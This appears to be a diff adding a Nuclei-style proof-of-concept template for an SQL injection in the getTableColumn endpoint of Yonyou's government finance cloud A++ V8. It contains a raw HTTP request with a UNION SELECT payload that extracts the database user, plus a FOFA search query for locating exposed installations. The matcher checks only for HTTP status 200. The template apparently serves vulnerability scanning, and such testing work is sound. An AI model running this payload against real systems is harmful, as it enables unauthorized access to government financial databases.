@@ -1,0 +1,27 @@
+id: poc-tiadv8125au06yan
+info:
+  name: 用友政务财务云A++ V8 getTableColumn 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tiadv8125au06yan'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tiadv8125au06yan
+    fofa: app="用友-政务财务系统"
+http:
+- raw:
+  - 'GET /lp/gwzjConfig/getTableColumn?view=LP_PAYFILES_INFO''+UNION+ALL+SELECT+CHR(126)||USER||CHR(126)+FROM+DUAL-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/789 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
